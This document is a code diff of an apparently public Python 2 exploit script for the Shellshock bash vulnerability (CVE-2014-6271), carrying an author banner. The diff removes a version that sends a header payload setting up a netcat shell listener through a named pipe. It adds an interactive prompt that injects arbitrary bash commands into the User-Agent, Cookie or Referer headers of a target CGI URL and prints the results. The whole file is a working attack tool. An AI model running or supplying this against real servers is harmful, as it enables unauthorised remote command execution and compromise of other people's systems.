@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # bash-shell 0day CVE-2014-6271
 
-import sys, os, httplib
+import sys, os, urllib2, argparse
 
 def cleaner():
 	if 'linux' in sys.platform:
@@ -21,33 +21,38 @@ ______           _           _____     _
                                                 __/ |
                                                |___/ 
 #####################################################
-
-Author: Muhammad Adeel aka Stoker
-Mail:   Chaudhary1337@gmail.com
-Blog:   http://urdusecurity.blogspot.com
-
+#Author: Muhammad Adeel aka Stoker                  #
+#Mail:   Chaudhary1337@gmail.com                    #
+#Blog:   http://urdusecurity.blogspot.com           #
 #####################################################
 \n'''
 
-def exploit(ip, uri):
-	var = httplib.HTTPConnection(ip)
-	back_connect = "() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1337 > /tmp/f'"
-	headers = {
-			"Content-type" : "application/x-www-form-urlencoded",
-			"Attck" : back_connect
-			}
-	request = var.request("GET", uri ,headers=headers).getresponse()
-	if request.status == 200:
-		print "[+] Connect on PORT 1337"
-		exit("Quiting!")
-	else:
-		print "[-] Not vulnerable."
-		exit()
-
-if __name__ == '__main__':
+def main():
 	banner()
-	if len(sys.argv) < 2:
-		print "\nUsage: {0} <IP> <Vuln CGI Path>".format(sys.argv[0])
-		exit()
-	exploit(sys.argv[1], sys.argv[2])
-	main()
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-u", help="exploit User-Agent parameter", action="store_true")
+	parser.add_argument("-c", help="exploit Cookie parameter", action="store_true")
+	parser.add_argument("-r", help="exploit Referer parameter", action="store_true")
+	parser.add_argument("ip", help="vulnerable URL/IP")
+	args = parser.parse_args()
+
+	try:
+		while True:
+			command = raw_input("w00t@UrduSecurity~$ ")
+			if command.strip() == 'exit':
+				break
+			injection = "() { :;}; echo \"Content-Type: text/html\"; echo; echo; /bin/bash -c \"" + command + "\""
+			request = urllib2.Request(args.ip)	
+			if args.u:
+		    		request.add_header("User-Agent", injection)
+			if args.c:
+		    		request.add_header("Cookie", injection)
+			if args.r:
+		    		request.add_header("Referer", injection)
+			result = urllib2.urlopen(request).read()
+			print result.strip()
+	except:
+   		print sys.exc_info()[1]
+
+if __name__ == "__main__":
+   main()
